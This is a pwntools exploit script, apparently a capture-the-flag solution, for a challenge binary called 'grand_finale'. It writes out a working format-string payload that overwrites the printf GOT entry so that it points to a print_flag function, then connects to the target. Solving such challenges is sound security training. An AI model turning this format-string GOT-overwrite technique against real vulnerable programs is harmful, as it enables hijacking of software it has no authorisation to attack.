#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.terminal = ['tmux', 'splitw', '-v']
exe = './grand_finale'
host = 'chal.sigpwny.com'
port = 1385

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *greet
continue
b *0x4013a4
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# print_flag_addr = 0x40129b
# address looks something like  0x00007ffff7aaa7c0, need to overwrite so it looks like 0x000000000040129b
exploit = b''
# write 0 bytes to zero out first 4 bytes of address
exploit += b'%14$n'
# smallest short - 0x0040
exploit += b'%64p' # 0x40 = 64
exploit += b'%15$hn'
# write last short - 0x129b
exploit += b'%4699p' # 0x129b - 0x40 = 0x125b = 4699
exploit += b'%16$hn'
# pad exploit to closest multiple of 8 bytes
exploit += b'_' * (8 - len(exploit) % 8)
# print(len(exploit))

# add address of printf GOT entry to overwrite
exploit += p64(0x404034)
exploit += p64(0x404032)
exploit += p64(0x404030) 

io.sendline(exploit)

io.interactive()





